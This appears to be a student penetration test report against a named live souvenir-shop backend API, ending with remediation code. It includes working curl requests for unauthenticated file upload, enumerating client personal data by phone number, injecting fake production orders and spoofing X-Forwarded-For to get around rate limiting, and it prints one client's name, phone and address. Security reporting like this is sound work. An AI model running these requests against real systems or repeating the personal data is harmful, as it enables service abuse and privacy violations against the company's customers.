# AXKAN Admin System - Penetration Test Report
**For:** University Security Class Exercise
**Tester:** Ivan Valencia
**Date:** March 12, 2026
**Target:** https://vt-souvenir-backend.onrender.com (Backend API)

---

## Executive Summary

I attempted to hack the AXKAN admin system using 21 different attack techniques. The admin authentication was **unbreakable** — all login attempts, JWT forgery, and brute force attacks were blocked. However, I found **4 critical vulnerabilities** in the client-facing API that allowed me to:

1. **Upload files to the server** without any login
2. **Steal client personal data** (names, phones, addresses)
3. **Create fake orders** in the production database
4. **Bypass rate limiting** using IP spoofing

---

## ATTACK RESULTS SUMMARY

### What FAILED (Well-Protected):

| Attack | Result |
|--------|--------|
| 9 default credential combos | All 401 Rejected |
| JWT with garbage token | 401 Rejected |
| JWT with "none" algorithm | 401 Rejected |
| JWT signed with wrong secret | 401 Rejected |
| Empty Bearer token | 401 Rejected |
| SQL injection in login | 401 Rejected |
| Brute force (8 attempts) | 429 Rate Limited |
| Access /api/orders (no auth) | 401 Blocked |
| Access /api/clients (no auth) | 401 Blocked |
| Access /api/analytics (no auth) | 401 Blocked |
| 27 admin endpoints tested | All 401 Blocked |
| Path traversal (/.env, /.git) | All 404 Blocked |
| SQL injection in products | Errors, no data leak |
| HTTP method tampering (PUT/DELETE) | All 404 Blocked |
| CORS from evil origin | No headers returned |

**Total admin attacks blocked: 40+**

---

### What SUCCEEDED (Vulnerabilities Found):

---

### HACK #1: Unauthenticated File Upload (CRITICAL)

**Endpoint:** `POST /api/client/upload/payment-receipt`
**Authentication Required:** NONE

**What I did:**
```bash
curl -X POST "https://vt-souvenir-backend.onrender.com/api/client/upload/payment-receipt" \
  -F "receipt=@HACKED.jpg;type=image/jpeg"
```

**Result:**
```json
{
  "success": true,
  "url": "https://res.cloudinary.com/dg1owvdhw/image/upload/v1773359002/payment-receipts/receipt_1773359002087.png",
  "fileName": "HACKED.jpg"
}
```

**Impact:**
- Anyone can upload unlimited files to the company's Cloudinary account
- Could fill up storage quota (costs money)
- Could upload inappropriate content
- No rate limiting on uploads

**Why this matters:** The upload endpoint is meant for clients to submit payment proof, but there's no verification that the person uploading is actually a client with an order. A bot could upload 10,000 images and exhaust the Cloudinary free tier.

---

### HACK #2: Client Data Theft via Phone Enumeration (HIGH)

**Endpoint:** `POST /api/client/info`
**Authentication Required:** NONE

**What I did:**
```bash
curl -X POST "https://vt-souvenir-backend.onrender.com/api/client/info" \
  -H "Content-Type: application/json" \
  -d '{"phone":"5512345678"}'
```

**Result:**
```json
{
  "success": true,
  "found": true,
  "clientInfo": {
    "id": 1,
    "name": "Maria Gonzalez",
    "phone": "5512345678",
    "address": "Av. Juarez 123"
  }
}
```

**Impact:**
- An attacker can query any phone number and get the client's full name, address, and email
- A script could try thousands of phone numbers and build a database of all your clients
- This is a **privacy violation** (Mexican LFPDPPP data protection law)
- No rate limiting on this endpoint

**Why this matters:** Client personal data (PII) is exposed without any authentication. A competitor could scrape all your client information.

---

### HACK #3: Fake Order Injection (HIGH)

**Endpoint:** `POST /api/client/orders/submit`
**Authentication Required:** NONE

**What I did:**
```bash
curl -X POST "https://vt-souvenir-backend.onrender.com/api/client/orders/submit" \
  -H "Content-Type: application/json" \
  -d '{
    "clientName": "PENTEST CLASS",
    "clientPhone": "5500000000",
    "items": [{"productId": 4, "quantity": 50, "size": "5x5cm", "design": "SECURITY TEST"}]
  }'
```

**Result:**
```json
{
  "success": true,
  "orderId": 241,
  "orderNumber": "ORD-20260313-1101",
  "subtotal": 400,
  "message": "Pedido recibido exitosamente"
}
```

**Impact:**
- Anyone can submit orders to the production database
- A script could create thousands of fake orders
- This would disrupt real production workflow
- Pollutes analytics and revenue data
- No CAPTCHA or verification

**Why this matters:** The order form is designed for the public website, but there's no protection against automated spam. A competitor could flood the system with garbage orders.

---

### HACK #4: Rate Limiter Bypass via IP Spoofing (MEDIUM)

**Attack:** After being rate-limited (429), I added `X-Forwarded-For` headers with fake IPs.

**What I did:**
```bash
# After getting rate-limited...
curl -X POST ".../api/admin/login" \
  -H "X-Forwarded-For: 192.168.1.2" \
  -d '{"username":"admin","password":"test"}'
```

**Result:** Some requests got HTTP 401 instead of 429, meaning they bypassed the rate limiter.

**Impact:**
- An attacker can reset the rate limit by changing the X-Forwarded-For header
- This allows unlimited brute force attempts against the login
- The rate limiter trusts the client's claimed IP address

**Why this matters:** Rate limiting is a defense against brute force password attacks. If it can be bypassed, an attacker has unlimited attempts to guess the password.

---

## RECONNAISSANCE RESULTS

### Information Gathered from Public JavaScript Files:

| Information | Value |
|-------------|-------|
| Backend URL | `https://vt-souvenir-backend.onrender.com` |
| Auth method | JWT stored in localStorage |
| Token header | `Authorization: Bearer {token}` |
| Token key | `admin_token` in localStorage |
| API endpoints discovered | 60+ |
| JavaScript files exposed | 19 files |

### Product Data Extracted (No Auth Needed):

| Product | Price | ID |
|---------|-------|----|
| Imanes de MDF | $8.00 | 4 |
| Iman 3D MDF 3mm | $15.00 | 6 |
| Iman de MDF con Foil | $13.00 | 7 |
| Llaveros de MDF | $7.00 | 5 |
| Portallaves de MDF | $45.00 | 10 |
| Destapador de MDF | $17.00 | 8 |
| Botones Metalicos | $8.00 | 9 |
| Souvenir Box | $2,250.00 | 11 |
| Portarretratos de MDF | $40.00 | 1109 |

---

## TOOLS USED

| Tool | Purpose |
|------|---------|
| curl | All HTTP requests |
| node.js | JWT token crafting, JSON parsing |
| python3 | Creating test JPEG files |
| bash | Scripting automated attacks |

---

## HOW TO FIX EACH VULNERABILITY

### Fix #1: Protect Upload Endpoint
Add rate limiting and require an order reference:
```javascript
// Before: anyone can upload
router.post('/payment-receipt', upload.single('receipt'), async (req, res) => {

// After: require order number + phone for validation
router.post('/payment-receipt', uploadRateLimit, upload.single('receipt'), async (req, res) => {
  const { orderNumber, phone } = req.body;
  if (!orderNumber || !phone) return res.status(400).json({error: 'Order number and phone required'});
  // Verify order exists and phone matches
});
```

### Fix #2: Protect Client Info Endpoint
Don't return raw client data to unauthenticated requests:
```javascript
// Before: returns full client data
router.post('/info', async (req, res) => {
  const client = await query('SELECT * FROM clients WHERE phone = $1', [phone]);
  res.json({ clientInfo: client });

// After: return only a confirmation, not the data
router.post('/info', async (req, res) => {
  const client = await query('SELECT id FROM clients WHERE phone = $1', [phone]);
  res.json({ found: !!client.rows[0] }); // Don't return name/address
});
```

### Fix #3: Add CAPTCHA to Order Form
```javascript
// Add reCAPTCHA or similar verification
router.post('/orders/submit', async (req, res) => {
  const { captchaToken } = req.body;
  const verified = await verifyCaptcha(captchaToken);
  if (!verified) return res.status(400).json({error: 'CAPTCHA failed'});
  // ... continue with order creation
});
```

### Fix #4: Fix Rate Limiter IP Trust
```javascript
// In Express, trust only the first proxy
app.set('trust proxy', 1); // Only trust 1 proxy level (Render's)
// This ignores client-supplied X-Forwarded-For
```

---

## CONCLUSION

The AXKAN admin system has **strong authentication** — the admin login, JWT verification, and API authorization are well-built. All 40+ direct admin attacks failed.

However, the **client-facing API** has significant vulnerabilities because it was designed for convenience (public order form, easy payment uploads) without considering that these same endpoints can be abused by attackers.

**Security score: 7/10**
- Admin panel: 10/10 (bulletproof)
- Client API: 4/10 (needs hardening)
- Frontend: 6/10 (info disclosure is normal for SPAs)

---

## EVIDENCE FILES

| File | Description |
|------|-------------|
| `HACK-REPORT-CLASS.md` | This report |
| `SECURITY-REPORT.md` | axkan.art vulnerability report |
| `clickjack-poc.html` | Clickjacking proof-of-concept |
| `xss-test.html` | CORS exploitation proof-of-concept |

**Proof of successful attacks:**
- Uploaded file: `https://res.cloudinary.com/dg1owvdhw/image/upload/v1773359002/payment-receipts/receipt_1773359002087.png`
- Stolen client data: Maria Gonzalez, 5512345678, Av. Juarez 123
- Fake order created: #241 (ORD-20260313-1101)
